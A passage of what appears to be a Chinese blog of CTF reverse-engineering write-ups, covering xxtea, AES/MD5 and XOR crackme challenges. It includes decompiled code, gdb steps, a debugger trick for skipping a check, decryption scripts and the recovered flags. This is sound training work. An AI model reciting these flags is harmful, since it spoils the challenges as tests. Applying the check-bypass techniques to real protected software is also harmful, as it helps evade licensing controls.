class="line">      v15 += 3i64;</span><br><span class="line">      break;</span><br><span class="line">    &#125;</span><br><span class="line">    v15 += 4i64;</span><br><span class="line">    if ( v15 &gt;= 16 )</span><br><span class="line">      break;</span><br><span class="line">  &#125;</span><br><span class="line">  for ( i = v15 + 1; i &lt; 0x10; ++i )</span><br><span class="line">    *(&amp;v30 + i) = 0;</span><br><span class="line">  v17 = sub_140001AB0(Code, v3, &amp;v30, &amp;Size);</span><br><span class="line">  v18 = Size;</span><br><span class="line">  v19 = v17;</span><br><span class="line">  v20 = operator new(Size);</span><br><span class="line">  v21 = 1;</span><br><span class="line">  *v20 = v19[2];</span><br><span class="line">  v22 = v20 + 1;</span><br><span class="line">  v20[1] = *v19;</span><br><span class="line">  v20[2] = v19[3];</span><br><span class="line">  v20[3] = v19[1];</span><br><span class="line">  v20[4] = v19[6];</span><br><span class="line">  v20[5] = v19[4];</span><br><span class="line">  v20[6] = v19[7];</span><br><span class="line">  v20[7] = v19[5];</span><br><span class="line">  v20[8] = v19[10];</span><br><span class="line">  v20[9] = v19[8];</span><br><span class="line">  v20[10] = v19[11];</span><br><span class="line">  v20[11] = v19[9];</span><br><span class="line">  v20[12] = v19[14];</span><br><span class="line">  v20[13] = v19[12];</span><br><span class="line">  v20[14] = v19[15];</span><br><span class="line">  v20[15] = v19[13];</span><br><span class="line">  v20[16] = v19[18];</span><br><span class="line">  v20[17] = v19[16];</span><br><span class="line">  v20[18] = v19[19];</span><br><span class="line">  v20[19] = v19[17];</span><br><span class="line">  v20[20] = v19[22];</span><br><span class="line">  v20[21] = v19[20];</span><br><span class="line">  v20[22] = v19[23];</span><br><span class="line">  for ( v20[23] = v19[21]; v21 &lt; v18; ++v22 )</span><br><span class="line">  &#123;</span><br><span class="line">    v23 = 0i64;</span><br><span class="line">    if ( v21 / 3 &gt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      v24 = *v22;</span><br><span class="line">      do</span><br><span class="line">      &#123;</span><br><span class="line">        v24 ^= v20[v23++];</span><br><span class="line">        *v22 = v24;</span><br><span class="line">      &#125;</span><br><span class="line">      while ( v23 &lt; v21 / 3 );</span><br><span class="line">    &#125;</span><br><span class="line">    ++v21;</span><br><span class="line">  &#125;</span><br><span class="line">  *&amp;v30 = 0xC0953A7C6B40BCCEui64;</span><br><span class="line">  v25 = v20 - &amp;v30;</span><br><span class="line">  *(&amp;v30 + 1) = 0x3502F79120209BEFi64;</span><br><span class="line">  v26 = 0i64;</span><br><span class="line">  v31 = 0xC8021823;</span><br><span class="line">  v32 = 0xFA5656E7;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    if ( *(&amp;v30 + v26) != *(&amp;v30 + v26 + v25) )</span><br><span class="line">      _exit(v8 * v8);</span><br><span class="line">    ++v8;</span><br><span class="line">    ++v26;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v26 &lt; 24 );</span><br><span class="line">  v27 = sub_140001620(std::cout, &quot;You win!&quot;);</span><br><span class="line">  std::ostream::operator&lt;&lt;(v27, sub_1400017F0);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用 findcrypt 看了一下，sub_140001AB0 这个函数是 xxtea 加密，然后在加密之后，后面对加密后的 flag 乱了一下顺序，再每 3 个数据位一组，进行了一些异或操作</p><p>至于前面一部分的操作，大佬的博客是这样说的</p><ol><li>判断输入的字符串的每个字符是否包含在 &quot;qwertyuiopasdfghjklzxcvbnm1234567890&quot; 中</li><li>取输入字符串的前 4 位字符，即 &quot;flag&quot;，扩展为 16 位，作为 xxtea 加密的秘钥 key</li></ol><p>其中的 flag 扩展为 16 位，就只要在右端补 0 就可以了</p><p>由最后的 if 条件可知，v30，v30+1，v31，v32 就是最后的结果，这里要注意一下小端序的问题，要反过来写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> xxtea</span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;CE BC 40 6B 7C 3A 95 C0 EF 9B 20 20 91 F7 02 35 23 18 02 C8 E7 56 56 FA&#x27;</span>.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">res = [<span class="built_in">int</span>(i,<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> result]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,i):</span><br><span class="line">        <span class="keyword">if</span> t == <span class="number">0</span>:</span><br><span class="line">            t = res[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            t ^= res[n]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        res[i*<span class="number">3</span>+j] ^= t</span><br><span class="line"></span><br><span class="line">box = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">11</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">12</span>,<span class="number">14</span>,<span class="number">17</span>,<span class="number">19</span>,<span class="number">16</span>,<span class="number">18</span>,<span class="number">21</span>,<span class="number">23</span>,<span class="number">20</span>,<span class="number">22</span>]</span><br><span class="line">m = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(box)):</span><br><span class="line">    m.append(res[box[i]])</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;flag&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(xxtea.decrypt(<span class="built_in">bytes</span>(m),key,padding=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure><p cxx_and_++tea>得到 flag：flag</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nostringattached</title>
      <link href="/2022/05/14/nostringattached/"/>
      <url>/2022/05/14/nostringattached/</url>
      
        <content type="html"><![CDATA[<p>这是一个 32 为 ELF 文件，用 ida 打开之后，发现没有什么明显的字符串出现，那么看到主函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setlocale(<span class="number">6</span>, &amp;locale);</span><br><span class="line">  banner();</span><br><span class="line">  prompt_authentication();</span><br><span class="line">  authenticate();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>表面上没有什么值得注意的，经过检查后发现 authenticate 才是关键函数</p><h1 id="authenticate函数"><a class="markdownIt-Anchor" href="#authenticate函数">#</a> authenticate 函数</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">authenticate</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">wchar_t</span> ws[<span class="number">8192</span>]; <span class="comment">// [esp+1Ch] [ebp-800Ch] BYREF</span></span><br><span class="line">  <span class="type">wchar_t</span> *s2; <span class="comment">// [esp+801Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  s2 = decrypt(&amp;s, &amp;dword_8048A90);</span><br><span class="line">  <span class="keyword">if</span> ( fgetws(ws, <span class="number">8192</span>, <span class="built_in">stdin</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    ws[wcslen(ws) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !wcscmp(ws, s2) )</span><br><span class="line">      wprintf(&amp;unk_8048B44);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      wprintf(&amp;unk_8048BA4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(s2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 ws 是输入的 flag，输入的 flag 等于 s2 则输出 &amp; unk_8048B44 这个字符串，点开之后得知就是 Success，也就是正确，所以 s2 就是 flag，但是并不能直接找到，我们先看一下 authenticate 函数的汇编代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">08048708</span>                 push    ebp</span><br><span class="line">.text:<span class="number">08048709</span>                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">0804870B</span>                 sub     esp, <span class="number">8028</span>h</span><br><span class="line">.text:<span class="number">08048711</span>                 mov     dword ptr [esp+<span class="number">4</span>], offset dword_8048A90 ; <span class="type">wchar_t</span> *</span><br><span class="line">.text:<span class="number">08048719</span>                 mov     dword ptr [esp], offset s ; s</span><br><span class="line">.text:<span class="number">08048720</span>                 call    decrypt</span><br><span class="line">.text:<span class="number">08048725</span>                 mov     [ebp+s2], eax</span><br><span class="line">.text:<span class="number">08048728</span>                 mov     eax, ds:<span class="built_in">stdin</span>@@GLIBC_2_0</span><br><span class="line">.text:<span class="number">0804872</span>D                 mov     [esp+<span class="number">8</span>], eax    ; stream</span><br><span class="line">.text:<span class="number">08048731</span>                 mov     dword ptr [esp+<span class="number">4</span>], <span class="number">2000</span>h ; n</span><br><span class="line">.text:<span class="number">08048739</span>                 lea     eax, [ebp+ws]</span><br><span class="line">.text:<span class="number">0804873F</span>                 mov     [esp], eax      ; ws</span><br><span class="line">.text:<span class="number">08048742</span>                 call    _fgetws</span><br><span class="line">.text:<span class="number">08048747</span>                 test    eax, eax</span><br><span class="line">.text:<span class="number">08048749</span>                 jz      <span class="type">short</span> loc_804879C</span><br><span class="line">.text:<span class="number">0804874B</span>                 lea     eax, [ebp+ws]</span><br><span class="line">.text:<span class="number">08048751</span>                 mov     [esp], eax      ; s</span><br><span class="line">.text:<span class="number">08048754</span>                 call    _wcslen</span><br><span class="line">.text:<span class="number">08048759</span>                 sub     eax, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0804875</span>C                 mov     [ebp+eax*<span class="number">4</span>+ws], <span class="number">0</span></span><br><span class="line">.text:<span class="number">08048767</span>                 mov     eax, [ebp+s2]</span><br><span class="line">.text:<span class="number">0804876</span>A                 mov     [esp+<span class="number">4</span>], eax    ; s2</span><br><span class="line">.text:<span class="number">0804876</span>E                 lea     eax, [ebp+ws]</span><br><span class="line">.text:<span class="number">08048774</span>                 mov     [esp], eax      ; s1</span><br><span class="line">.text:<span class="number">08048777</span>                 call    _wcscmp</span><br><span class="line">.text:<span class="number">0804877</span>C                 test    eax, eax</span><br><span class="line">.text:<span class="number">0804877</span>E                 jnz     <span class="type">short</span> loc_804878F</span><br><span class="line">.text:<span class="number">08048780</span>                 mov     eax, offset unk_8048B44</span><br><span class="line">.text:<span class="number">08048785</span>                 mov     [esp], eax</span><br><span class="line">.text:<span class="number">08048788</span>                 call    _wprintf</span><br><span class="line">.text:<span class="number">0804878</span>D                 jmp     <span class="type">short</span> loc_804879C</span><br></pre></td></tr></table></figure><p>看到 6、7 行我们可以知道，我们的 s2 字符串在调用 decrypt 函数的时候杯传入了 eax 寄存器中，如果我们可以获取 eax 中的值就可以直接得到 flag 了，而这里我们需要用到 gdb 调试</p><h1 id="gdb调试"><a class="markdownIt-Anchor" href="#gdb调试">#</a> gdb 调试</h1><p>首先用 gdb 打开文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb 1 (也可以加一个-q界面会更简洁)</span><br></pre></td></tr></table></figure><img src="/2022/05/14/nostringattached/1.png" class><p>然后在 decrypt 函数处设置断点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b decrypt  // (breakpoint)</span><br></pre></td></tr></table></figure><p>再执行到断点处</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r  // (run)</span><br></pre></td></tr></table></figure><p>单步执行 decrypt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n  // (Step Over)</span><br></pre></td></tr></table></figure><img src="/2022/05/14/nostringattached/2.png" class><p>显示寄存器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i r  // (Info register)</span><br></pre></td></tr></table></figure><img src="/2022/05/14/nostringattached/3.png" class><p>最后就可以查看 eax 中的数据了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/6sw $eax</span><br></pre></td></tr></table></figure><p>其中</p><p>6：显示六行数据</p><p>s：字符串形式</p><p>w：word（4 字节）形式</p><img src="/2022/05/14/nostringattached/4.png" class><p>得到 flag：<strong>9447{you_are_an_international_mystery}</strong></p><p>题目来源：<a href="https://adworld.xctf.org.cn/">攻防世界 (xctf.org.cn)</a>——no-strings-attached</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>re3</title>
      <link href="/2022/05/09/re3/"/>
      <url>/2022/05/09/re3/</url>
      
        <content type="html"><![CDATA[<p>这是一个 64 位 ELF 文件，在 Linux 中打开了一下没什么提示，随便输入几个字符提示 wrong，还是用 ida 打开它吧，打开之后直接看到主函数</p><img src="/2022/05/09/re3/1.png" class><p>其中有一个 for 循环进行了很多轮异或运算，而这个 sub_402219 函数正是参与运算的值，而且在后面它又作为函数单独出现，但是它又打不开，在汇编代码中可以找到这个函数的地址，发现这里有一大堆数据，所以我们需要把这一段数据给还原</p><img src="/2022/05/09/re3/2.png" class><p>我们选中 402219 的地址段，按 D 将其转化为数据，然后再通过 idc 脚本将其还原，脚本如下</p><img src="/2022/05/09/re3/3.png" class><p>然后选择数据之后按 C 分析数据，点击 force 强制执行，再将其转化为函数就可以了，这样之后我们的 sub_402219 函数就正常了，就可以正常打开了</p><p>在打开之前我们先用 findcrypt 看一下有哪些加密</p><img src="/2022/05/09/re3/4.png" class><p>有 md5 和 AES 两种加密，我们再看看 sub_402219 函数</p><h1 id="sub_402219函数"><a class="markdownIt-Anchor" href="#sub_402219函数">#</a> sub_402219 函数</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_402219</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+18h] [rbp-D8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-D4h]</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">200</span>]; <span class="comment">// [rsp+20h] [rbp-D0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+E8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_400A71(v4, &amp;unk_603170);</span><br><span class="line">  sub_40196E(v4, a1);</span><br><span class="line">  sub_40196E(v4, a1 + <span class="number">16</span>);</span><br><span class="line">  v2 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(i + a1) != byte_6030A0[i] )</span><br><span class="line">      v2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到三个关键函数，第一个函数应用了刚刚在主函数中可以看到的 &amp; unk_603170 这一组数据，但我们不知道，可以在后面的调试中获取</p><p>在进行三轮加密之后，与 byte_6030A0 数组进行对比，byte_6030A0 数组的数据如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xBC</span>, <span class="number">0x0A</span>, <span class="number">0xAD</span>, <span class="number">0xC0</span>, <span class="number">0x14</span>, <span class="number">0x7C</span>, <span class="number">0x5E</span>, <span class="number">0xCC</span>, <span class="number">0xE0</span>, <span class="number">0xB1</span>, </span><br><span class="line">  <span class="number">0x40</span>, <span class="number">0xBC</span>, <span class="number">0x9C</span>, <span class="number">0x51</span>, <span class="number">0xD5</span>, <span class="number">0x2B</span>, <span class="number">0x46</span>, <span class="number">0xB2</span>, <span class="number">0xB9</span>, <span class="number">0x43</span>, </span><br><span class="line">  <span class="number">0x4D</span>, <span class="number">0xE5</span>, <span class="number">0x32</span>, <span class="number">0x4B</span>, <span class="number">0xAD</span>, <span class="number">0x7F</span>, <span class="number">0xB4</span>, <span class="number">0xB3</span>, <span class="number">0x9C</span>, <span class="number">0xDB</span>, </span><br><span class="line">  <span class="number">0x4B</span>, <span class="number">0x5B</span></span><br></pre></td></tr></table></figure><p>而这段加密是 AES 加密（小声 bb：我还没有学），不过通过刚才的 findcrypt 可以分析出来这里是 AES 加密，第一个函数就是生成轮密钥，而且那个未知数组是初始密钥，第二个和第三个函数分别是对输入字符串的前后 16 位进行 AES 加密</p><h1 id="sub_40207b函数"><a class="markdownIt-Anchor" href="#sub_40207b函数">#</a> sub_40207B 函数</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_40207B</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v2[<span class="number">16</span>]; <span class="comment">// [rsp+10h] [rbp-50h] BYREF</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+20h] [rbp-40h] BYREF</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+30h] [rbp-30h] BYREF</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+40h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_401CF9(&amp;BASE64_table_603120, <span class="number">0x40</span>uLL, v2);</span><br><span class="line">  sub_401CF9(&amp;unk_603100, <span class="number">0x14</span>uLL, &amp;v3);</span><br><span class="line">  sub_401CF9(&amp;Prime_Constants_char_6030C0, <span class="number">0x35</span>uLL, &amp;v4);</span><br><span class="line">  sub_401CF9(MD5_Constants_4025C0, <span class="number">0x100</span>uLL, &amp;v5);</span><br><span class="line">  sub_401CF9(v2, <span class="number">0x40</span>uLL, a1);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个函数中，sub_401CF9 函数将 base64 表传入，并进行了加密</p><img src="/2022/05/09/re3/5.png" class><p>可以识别出这是 MD5 加密，在加密之后，被储存在 v2 中，之后又在 14 行进行了一次 MD5 加密后储存在 a1，也就是我们要找到的 &amp; unk_603170 数组中</p><h1 id="总体思路"><a class="markdownIt-Anchor" href="#总体思路">#</a> 总体思路</h1><p>在第一个函数中将 base64 表进行了两次 MD5 加密，然后以其作为第二个函数中的 AES 加密的初始密钥，在进行 AES 加密，加密后的结果已经储存在 byte_6030A0 数组中且是可见的，而密钥是可以通过调试获取的，但因为这道题它是一个 ELF 文件，在 windows 是无法调试的，所以只能通过 Linux 进行远程调试，获取数据之后，用脚本进行 AES 解密就可以得到 flag</p><h1 id="远程调试"><a class="markdownIt-Anchor" href="#远程调试">#</a> 远程调试</h1><p>我用的 Linux 系统是 kali，第一次调试，先要把 linux_server 文件放到 kali 里面，然后再直接把文件放到 kali 的桌面上，然后复制一下它的文件位置，然后我们在桌面打开 kali 的终端，并且打开 Linux_server64 文件，之后回到 windows 的 ida 中，选择 debugger 为 remote Linux debugger，之后输入文件在 kali 中位置和虚拟机的 ip 即可开始调试了</p><p>这里有一个点要注意，就是我们如果在函数的开始部分就下断点，然后通过输入一个 32 长度的字符串的话，是无法绕过 if 的判断的，还是会退出程序，所以我们就在又在 if 判断的前后分别下一个断点，在运行到 if 之前的断点的时候再 ctrl+F7 跳过到下一个断点，通过这个方式来绕过，绕过之后再单步调试到 &amp; unk_603170 所在函数，然后再进入汇编代码段获取数据就可以获取到它的数据了</p><img src="/2022/05/09/re3/6.png" class><h1 id="脚本"><a class="markdownIt-Anchor" href="#脚本">#</a> 脚本</h1><p>在知道了密钥之后和最终密文之后，就是通过脚本进行 AES 解密获取明文 flag 了，我还不会 AES 所以就参照了大佬的脚本，不过不知道为什么我运行不了这个脚本，不过有的别的脚本可以运行，这里我就把两个脚本都放在这吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line">aes = AES.new(decode_hex(<span class="string">&#x27;CB8D493521B47A4CC1AE7E62229266CE&#x27;</span>)[<span class="number">0</span>], AES.MODE_ECB)</span><br><span class="line"><span class="built_in">print</span>(aes.decrypt(decode_hex(<span class="string">&#x27;BC0AADC0147C5ECCE0B140BC9C51D52B46B2B9434DE5324BAD7FB4B39CDB4B5B&#x27;</span>)[<span class="number">0</span>])) </span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex, a2b_hex</span><br><span class="line">mode = AES.MODE_ECB</span><br><span class="line">key = <span class="string">b&#x27;\xcb\x8d\x49\x35\x21\xb4\x7a\x4c\xc1\xae\x7e\x62\x22\x92\x66\xce&#x27;</span></span><br><span class="line">text = <span class="string">b&#x27;\xBC\x0A\xAD\xC0\x14\x7C\x5E\xCC\xE0\xB1\x40\xBC\x9C\x51\xD5\x2B\x46\xB2\xB9\x43\x4D\xE5\x32\x4B\xAD\x7F\xB4\xB3\x9C\xDB\x4B\x5B&#x27;</span></span><br><span class="line">cryptos = AES.new(key, mode)</span><br><span class="line">cipher_text = cryptos.decrypt(text)</span><br><span class="line"><span class="built_in">print</span>(b2a_hex(cipher_text))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意一下第二个脚本得到的数据还要十六进制转 ASCII 一下</p><p>最后得到<strong> flag {924a9ab2163d390410d0a1f670}</strong></p><p>题目来源：<a href="https://buuoj.cn/challenges">BUUCTF 在线评测 (buuoj.cn)</a>——re3</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019红帽杯easyRE</title>
      <link href="/2022/05/07/2019%E7%BA%A2%E5%B8%BD%E6%9D%AFeasyRE/"/>
      <url>/2022/05/07/2019%E7%BA%A2%E5%B8%BD%E6%9D%AFeasyRE/</url>
      
        <content type="html"><![CDATA[<p>这道题是个 elf 文件，在 Linux 环境中打开之后发现什么提示都没有，随便输入一串字符也没提示就直接退出了，于是就还是用 ida pro 打开，发现没有主函数的窗口，那就检索字符串吧，看到这么一大堆字符串</p><img src="/2022/05/07/2019%E7%BA%A2%E5%B8%BD%E6%9D%AFeasyRE/1.png" class><p>然后交叉引用一下进入到该字符串所在的函数，这应该就是关键函数了，发现这里有十个一样的函数</p><img src="/2022/05/07/2019%E7%BA%A2%E5%B8%BD%E6%9D%AFeasyRE/2.png" class><img src="/2022/05/07/2019%E7%BA%A2%E5%B8%BD%E6%9D%AFeasyRE/3.png" class><p>就发现这是 base64，而且进行了十次，进行十次之后的结果就是刚才那一大堆字符串，然后把它解码十次之后，就… 就得到了一个网站 https://bbs.pediy.com/thread-254172.htm，然后进去这个网站之后，根本就没有 flag</p><p>说明我们思路不对，所以我就返回去看主函数，看到这一部分</p><img src="/2022/05/07/2019%E7%BA%A2%E5%B8%BD%E6%9D%AFeasyRE/4.png" class><p>这里将三个字符串拼到一起，然后还在 v [12] 和 v [13] 的末端加了一个 127，然后再进行一次异或运算，写了个脚本得到了 Info:The first four chars are `flag`，这应该是一个提示，然后在这里呆了半天也不知道下一步该怎么做，看了大佬的题解提示，在进行完上面的异或和 base 循环之后，下面又调用了 sub_400D35 这个函数</p><img src="/2022/05/07/2019%E7%BA%A2%E5%B8%BD%E6%9D%AFeasyRE/5.png" class><p>我们看看这个函数</p><img src="/2022/05/07/2019%E7%BA%A2%E5%B8%BD%E6%9D%AFeasyRE/6.png" class><p>关键部分就是一个 if 条件语句和一个 for 循环了，if 的括号中的条件，是 v4 和一个已知数组的异或</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x40</span>, <span class="number">0x35</span>, <span class="number">0x20</span>, <span class="number">0x56</span>, <span class="number">0x5D</span>, <span class="number">0x18</span>, <span class="number">0x22</span>, <span class="number">0x45</span>, <span class="number">0x17</span>, <span class="number">0x2F</span>, <span class="number">0x24</span>, <span class="number">0x6E</span>, <span class="number">0x62</span>, <span class="number">0x3C</span>, <span class="number">0x27</span>, <span class="number">0x54</span>, <span class="number">0x48</span>, <span class="number">0x6C</span>, <span class="number">0x24</span>, <span class="number">0x6E</span>, <span class="number">0x72</span>, <span class="number">0x3C</span>, <span class="number">0x32</span>, <span class="number">0x45</span>, <span class="number">0x5B</span>]</span><br></pre></td></tr></table></figure><p>也容易看出前四位的异或结果应该就是 flag 了，然后在下面的 for 循环中再和 v4 进行异或，要知道 v4 我们就再进行一次异或就可以得到，然后就可以进行 for 循环中的异或了，异或之后的结果应该就是 flag 了，毕竟前四个结果就是 flag 嘛，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span 